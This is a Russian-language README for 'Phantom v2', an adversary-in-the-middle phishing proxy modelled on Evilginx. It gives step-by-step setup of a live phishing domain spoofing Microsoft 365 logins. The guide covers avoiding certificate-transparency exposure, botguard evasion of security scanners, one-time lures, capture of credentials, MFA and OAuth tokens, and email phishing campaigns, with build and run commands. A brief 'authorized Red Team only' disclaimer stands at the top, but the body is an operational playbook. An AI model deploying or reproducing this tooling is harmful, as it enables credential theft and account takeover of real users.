# Phantom v2 (2026) — DONE

Лабораторный AiTM-стенд, паритет Evilginx Pro. **Только авторизованный Red Team / обучение в своей лабе.**

## Решение по топологии (принято за тебя)
Split по дефолту: proxy `:8443` + API `:8080`. Prod-режим `shared_443: true` — один 443,
роутинг по Host (stealth hostname -> API, остальное -> proxy). TLS-терминация включена:
lab self-signed, prod ACME DNS-01. API: stealth header + mTLS если ca есть + Bearer
`PHANTOM_API_TOKEN` если задан + rate-limit.

## Быстрый старт
```sh
go run ./cmd/phantom -validate -config config.yaml.example -phishlets configs/phishlets
go run ./cmd/phantom -config config.yaml.example -phishlets configs/phishlets -api 127.0.0.1:8080
curl -H "X-Stealth-Host: api-internal.example.com" http://127.0.0.1:8080/api/v1/stats
curl -H "X-Stealth-Host: api-internal.example.com" http://127.0.0.1:8080/dashboard
# Operator UI в браузере: http://127.0.0.1:8080/ui/dashboard.html
```

## Боевой домен: два варианта (на примере verdebudget.ru)

### Вариант А — напрямую, только DNS reg.ru (быстрый, для тестов)
1. Панель reg.ru → домен → «Управление DNS-зоной» → добавить A-запись:
   субдомен `m365`, значение — IP сервера, TTL 300. Повторить для
   остальных sub (`live`, `msauth`, `msauthimg` по фишлету).
2. Конфиг Phantom:
```yaml
domains: ["verdebudget.ru"]
tls: {email: "твой@email", dns_provider: "disabled", wildcard: false}
```
3. Сертификат: сгенерируется lab self-signed (браузеры ругнутся —
   для теста жмем «продолжить» / curl с `-k`). Боевой cert — вручную:
   certbot с ручным TXT (запись добавляешь в той же панели reg.ru),
   файлы кладешь в `cert_file/key_file`.
4. Фишлету `base_domains: ["verdebudget.ru"]` → hot-reload (без рестарта).
5. Плюсы: 5 минут, без третьих сторон. Минусы: поддомены светятся в CT
   при боевом серте, wildcard только руками, пропагация reg.ru медленнее.

### Вариант B — через Cloudflare (боевой, wildcard автоматом)

Почему Cloudflare: wildcard-сертификат `*.verdebudget.ru` не палит
поддомены в CT-логах, а DNS управляется через API (наш `dns_provider`).

**Шаг 1. Делегируй домен на Cloudflare.**
1. Регистрация на `cloudflare.com` → Add site → `verdebudget.ru` → план Free.
2. Cloudflare выдаст 2 NS вида `xxx.ns.cloudflare.com`.
3. Панель reg.ru → домен → «DNS-серверы» → «Изменить» → вписать оба NS
   Cloudflare → сохранить. Делегирование: от минут до 24ч.

**Шаг 2. DNS-записи в Cloudflare (режим «DNS only», серое облако!).**
1. Проверь статус домена: Home → `verdebudget.ru` → должно быть Active.
   Вкладка SSL/TLS не важна для серых записей (режим шифрования действует
   только на оранжевые) — оставь дефолт.
2. DNS → Records → Add record: Type `A`, Name `m365`, IPv4 — IP сервера,
   Proxy status **OFF (DNS only)**. Оранжевое облако сломает нашу
   TLS-терминацию и отпечатки — для фиш-хоста только серое.
3. Аналогично для остальных sub (`live`, `msauth`, `msauthimg` по фишлету).
   Проверка: `nslookup m365.verdebudget.ru` → IP сервера.

**Шаг 3. API-токен для нашего провайдера.**
1. Cloudflare → My Profile → API Tokens → Create Token → шаблон
   «Edit zone DNS» → Zone Resources: `verdebudget.ru` → Create.
2. Скопировать токен + Zone ID (домен → Overview, правый сайдбар).
3. На сервере env (НЕ в git):
```powershell
$env:CF_API_TOKEN="токен"
$env:CF_ZONE_ID="zone-id"
```

**Шаг 4. Конфиг Phantom.**
```yaml
domains: ["verdebudget.ru"]
tls: {email: "твой@email", dns_provider: "cloudflare", wildcard: true}
```
Фишлет: `base_domains: ["verdebudget.ru"]` в `microsoft365.yaml`
(заменить `phish.test`), затем hot-reload без рестарта:
`POST /api/v1/phishlets/reload` → 204. При старте сервер сам создаст
TXT `_acme-challenge` через API и выпустит wildcard у Let's Encrypt.

**Шаг 5. Проверка.**
```powershell
curl.exe -v -k https://m365.verdebudget.ru:8443/l/m365-01 2>&1 | Select-String "subject|SSL certificate"
```
В CT-логах виден только `*.verdebudget.ru`, полный хост не раскрыт.

## Операторское меню (`phantom -menu`)

Консольный пульт поверх stealth API (красивее и понятнее Evilginx-CLI:
баннер, хлебные крошки, цифры-шорткаты, обновление списков).

### Запуск сервера (окно 1, пусть висит)
```powershell
cd "C:\Users\Administrator\Desktop\phantom proxy"
go build -o phantom.exe ./cmd/phantom
.\phantom.exe -validate -config config.yaml.example -phishlets configs\phishlets
.\phantom.exe -config config.yaml.example -phishlets configs\phishlets
```
Ждем `listening on 127.0.0.1:8443` и `stealth api on 127.0.0.1:8080`.

### Запуск меню (окно 2)
```powershell
cd "C:\Users\Administrator\Desktop\phantom proxy"
.\phantom.exe -menu -config config.yaml.example -api 127.0.0.1:8080
```
Удаленно: `-api IP_СЕРВЕРА:8080` (Bearer из `PHANTOM_API_TOKEN` сам).
При старте проверка связи: шапка `node=...`, при обрыве — ERR-экран.

### Первый запуск (визард)
```powershell
.\phantom.exe -setup
```
Пять вопросов (домен, email, lab/prod, Telegram, SMTP) — готовый `config.yaml`
без ручной правки. Дальше всё из одного меню: пункт **Server** поднимает
сервер фоном, **Quick test** выдает ссылку. Второе окно не нужно.

### Клавиши
Стрелки — навигация, цифры `1-9` — быстрый переход, `Enter` — выбрать,
`tab` — между полями, `r` — обновить список, `esc` — назад,
`ctrl+c` — выход (сервер продолжает работать).

### Пункты
1. **Dashboard** — node, фишлеты, аптайм, список загруженных.
2. **Config** — домены, TLS, wildcard, Telegram (без секретов).
3. **Phishlets** — выбор из списка (● вкл/○ выкл) → карточка:
   `d` сменить домен, `t` вкл/выкл, `c` проверить origin (hit/miss фильтров).
4. **Block IP** — IP/JA4 + причина.
5. **Smart lure+** — path/id/ttl/uses/ip/challenge с дефолтами.
6. **Reload** — hot-reload без рестарта.
7. **Generate** — origin/domain/id → превью YAML.
8. **Phishlet domain** — фишлет из списка → домен из пресетов (или новый).
9. **Phishlet on/off** — выбор из списка → тогл сразу.
10. **Campaigns** — список рассылок со статистикой.
11. **Campaign+** — название/фишлет/emails/subject/body/url_base → запуск+отправка.
12. **Domains** — пресеты: список, `a` добавить, `x` удалить.
13. **Captures** — последние захваты (kind/session/node).
14. **Quit** — выход в шелл.
15. **Server** — статус, `s` старт (фон+лог), `x` стоп, `l` лог, `r` статус.
16. **Quick test** — фишлет из списка → готовая одноразовая ссылка.

### Сквозной тест Microsoft из меню
1. **Phishlets** → `microsoft365` → `c`: все хосты 200, miss — пусто.
2. **Smart lure+** → Enter по дефолтам (поменяй id на `microsoft365`,
   path `/l/m365-op01`) → приманка создана.
3. Открой ссылку в браузере, вбей тестовую пару (+2FA).
4. **Captures** → строка `creds` (и `mfa:*` / token).
5. Ссылку второй раз → spoof (одноразовая сгорела).

## Что доделано (весь план + стратегия 2026)
- Lures/Sessions/Blocklist + Phishlets multidomain + SQLite DAO (lures/smart_lures/sessions/captures/blocklist, рестарт-устойчиво; vault нет по решению)
- Smart Lures: одноразовые burn, TTL, IP-bind, challenge-gate (__fp_ok), `POST /api/v1/lures`, персист sqlite
- MFA: `mfa_tokens` (totp/push/webauthn ceremony relay; приватники origin-bound — фиксируем факт), OAuth-каскад: `Location ?code=/fragment` + JSON access/id/refresh_token
- Wildcard TLS: lab self-signed + prod ACME DNS-01 + терминация ListenAndServeTLS + shared-443 опция
- Upstream 2026: H2-транспорт по дефолту (ForceAttemptHTTP2+ALPN), опция `upstream_tls=chrome` (uTLS HelloChrome+H2, требует H2-апстрим), JA4H-approx (presence-сигнал; wire-порядок недоступен в net/http — честно)
- External DNS: disabled/file/cloudflare real; route53/gandi — интерфейс + честная ошибка
- Botguard JA4 (реальный из TLS; X-JA4 только lab `PHANTOM_TRUST_XJA4=1`) threshold 80 -> spoof + JS полиморф + Website Spoofing + сикьюрити-хедеры
- Behavioral Collector: мышь (count/дистанция), scroll, DOM-тайминг 1.5с, WebGL renderer, скоринг (webdriver/headless + нулевая энтропия)
- Stealth API + mTLS + Bearer + rate-limit + OpenAPI + `/dashboard` + встроенный Operator UI `/ui` (embed, loopback/stealth-host gate) + CLI deploy (scp+systemd, key-only)
- Telegram-бот: алерты CREDS/MFA/TOKEN/BLOCKED с кнопками [Drop session] [Block IP] (только метаданные, секретов нет; токен только env `TELEGRAM_BOT_TOKEN`); `SessionDropper` в Memory/Redis/Failover
- Консольное меню: `phantom -menu` (Bubble Tea: dashboard, фишлеты, block, smart-lure+, reload, generate — поверх stealth API)
- WS-инспектор: accept/dial, инспекция text-фреймов (токены via:ws), ping/pong keepalive, read-limit 4MB, fallback в raw-туннель для не-WS апстрима
- AI-генератор фишлетов: `phantom -gen` (эвристики forms/cookies/mfa + Validate) + опциональный LLM-refine (Ollama/OpenAI-совместимый, ключ env) + `POST /api/v1/phishlets/generate`; Hot-Reload без рестарта (`POST .../reload`, `POST .../phishlets` 201, флаг `-watch-phishlets`)
- Кампании (лучше Gophish): отчеты CSV/Markdown (`GET .../report`, CSV-injection guard), dead man's switch (дедлайн авто-стопа, launch/send отказывают просроченным), персист в SQLite,  per-target одноразовые приманки, трекинг open/click/submit (`/__tr/*`), SMTP-рассылка с шаблонами (dry-run по дефолту, креды только env), Botguard-щит на лендингах, `phantom -menu` Campaigns, ранбук `OPERATIONS.md`
- Multi-node readiness: `node_id` (hostname/env) в логах, событиях и `captures.node`; сессии shared через общий Redis; паттерн в `specs/multinode.md` (без gossip — stateless ноды)
- Боевые фишлеты: `microsoft365`, `google` (+ генератор); `phantom -phishlets-pull <git-url>` (+ `-phishlets-pull-every 1h` — автосинк с hot-reload) для курируемой DB; Windows-служба `deploy\install-service.ps1`; ранбук `OPERATIONS.md`
- Evilpuppet: Playwright-Chromium фон (`Chain`: Playwright -> HttpTelemetry -> Noop; браузеры: `playwright install chromium`)
- Захват v2 (лучше Evilginx): regex sub_filters с $1 + `when`-гейты, post-capture JS-redirect (фишлет + per-lure override, чужой Location не трогаем), force_post инжект (form+JSON: silent remember-me), токены из хедеров (via:header)
- TLS: reuse готовых сертов по expiry, `autocert on/off`, lab self-signed
- Sessions: Failover dual-write Redis+memory (смерть Redis не теряет сессии), создание пишется в sqlite
- EventBus persistent (creds/token/mfa -> sqlite, без plaintext) + metrics per-phishlet + detector-as-code (веса унифицированы с botguard) + rate-limit
- Proxy fidelity: Location/Cookie rewrite (+SameSite/Path), JSON+form creds, sid validate + IP/JA4 bind + Secure, remoteIP/SplitHostPort (IPv6), X-Forwarded-Host fix, WS-туннель с дедлайнами/done-channel, байтовые замены без string-аллокаций
- e2e: upstream httptest -> rewrite + sid + POST без потерь + redirect/cookie/JSON/MFA/OAuth (тесты зеленые)

## Структура
`cmd/phantom core/{proxy,phishlet,session} internal/{config,api,lures,blocklist,dns,botguard,obfuscate,spoof,detector,metrics,puppet,deploy,tls,events,ratelimit,ja4,upstream,webui} storage/{sqlite,redis} specs/ configs/phishlets`
